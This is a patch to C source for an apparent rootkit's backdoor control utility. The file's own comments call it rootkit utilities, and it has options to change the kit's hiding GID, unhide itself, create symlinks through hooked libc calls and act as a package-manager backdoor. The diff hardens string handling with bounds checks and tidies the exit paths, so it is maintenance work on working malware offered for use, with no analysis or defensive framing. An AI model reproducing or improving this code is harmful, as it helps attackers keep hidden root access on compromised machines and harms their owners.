@@ -8,13 +8,20 @@ void option_err(char *a0){
     printf("\t%s changegid\n", a0);
 #endif
 #ifdef BACKDOOR_PKGMAN
+    size_t tmpsize, buflen;
     char validmans[16*VALIDPKGMANS_SIZE];
     memset(validmans, 0, sizeof(validmans));
     for(int i = 0; i != VALIDPKGMANS_SIZE; i++){
-        char tmp[strlen(validpkgmans[i])+2];
-        memset(tmp, 0, sizeof(tmp));
-        snprintf(tmp, sizeof(tmp), "%s/", validpkgmans[i]);
-        strncat(validmans, tmp, sizeof(validmans));
+        tmpsize = strlen(validpkgmans[i])+2;
+        buflen = strlen(validmans);
+
+        if(buflen+tmpsize >= sizeof(validmans)-1)
+            break;
+
+        char tmp[tmpsize];
+        memset(tmp, 0, tmpsize);
+        snprintf(tmp, tmpsize, "%s/", validpkgmans[i]);
+        strncat(validmans, tmp, tmpsize);
     }
     validmans[strlen(validmans)-1]='\0';
     printf("\t%s %s <args>\n", a0, validmans);
@@ -43,38 +50,38 @@ void do_self(void){
 #else
     execl(args[0], args[1], NULL);
 #endif
-    exit(0);
 }
 
 void symlinkstuff(void){
     hook(CACCESS, CSYMLINK);
 
     char *src, *dest, *linkname;
-    int ok=0, fail=0, acc, syml;
+    int ok=0, fail=0, exist=0, acc, syml;
     for(int i = 0; i != LINKSRCS_SIZE; i++){
         src = linksrcs[i];
         dest = linkdests[i];
         linkname = basename(dest);
 
         acc = (long)call(CACCESS, src, F_OK);
-        if(acc < 0){
-            printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
+        if(acc < 0 && errno != ENOENT){
             fail++;
+            printf("Something went wrong trying to access %s (\e[31m%s\e[0m)\n", src, linkname);
             continue;
-        }
+        }else if(acc < 0) continue;
 
         syml = (long)call(CSYMLINK, src, dest);
         if(syml < 0 && errno == EEXIST){
-            printf("Link \e[31m%s\e[0m already exists...\n", linkname);
+            exist++;
             continue;
         }else if(syml < 0){
-            printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
             fail++;
+            printf("Failed linking: %s -> ~/\e[31m%s\e[0m\n", src, linkname);
         }else ok++;
     }
 
-    if(fail > 0) printf("Failed links: \e[31m%d\e[0m\n", fail);
-    exit(0);
+    if(ok > 0) printf("\e[1mSuccessful links: \e[1;31m%d\e[0m\n", ok);
+    if(exist > 0) printf("\e[1mLinks already exist: \e[1;31m%d\e[0m\n", exist);
+    if(fail > 0) printf("\e[1mFailed links: \e[1;31m%d\e[0m\n", fail);
 }
 
 /* everything in here calls to misc rootkit utils. */
@@ -95,11 +102,18 @@ void dobdvutil(char *const argv[]){
             char argbuf[256];
             memset(argbuf, 0, sizeof(argbuf));
             
+            size_t tmpsize, buflen;
             for(int argi = 1; argv[argi] != NULL; argi++){
-                char tmp[strlen(argv[argi])+2];
-                memset(tmp, 0, sizeof(tmp));
-                snprintf(tmp, sizeof(tmp), "%s ", argv[argi]);
-                strncat(argbuf, tmp, sizeof(argbuf));
+                tmpsize = strlen(argv[argi])+2;
+                buflen = strlen(argbuf);
+
+                if(buflen+tmpsize >= sizeof(argbuf)-1)
+                    break;
+
+                char tmp[tmpsize];
+                memset(tmp, 0, tmpsize);
+                snprintf(tmp, tmpsize, "%s ", argv[argi]);
+                strncat(argbuf, tmp, tmpsize);
             }
             argbuf[strlen(argbuf)-1]='\0';
 
@@ -119,10 +133,10 @@ void dobdvutil(char *const argv[]){
 
 #ifdef READ_GID_FROM_FILE
     if(!strcmp("changegid", option)){
-        gid_t newgid;
+        gid_t oldgid=readgid(), newgid;
         printf("Changing kit GID. You must \e[1;31mreconnect\e[0m once it has changed.\n");
         printf("Make sure you don't have any other \e[1;31mprocesses running\e[0m other than this.\n");
-        printf("Current GID: \e[1;31m%u\e[0m\n", readgid());
+        printf("Current GID: \e[1;31m%u\e[0m\n", oldgid);
         printf("Press enter to confirm.");
         getchar();
         
@@ -144,11 +158,15 @@ void dobdvutil(char *const argv[]){
         exit(0);
     }
 
-    if(!strcmp("unhideself", option))
+    if(!strcmp("unhideself", option)){
         do_self();
+        exit(0);
+    }
 
-    if(!strcmp("makelinks", option))
+    if(!strcmp("makelinks", option)){
         symlinkstuff();
+        exit(0);
+    }
 
     path = argv[2];
     if(path == NULL)
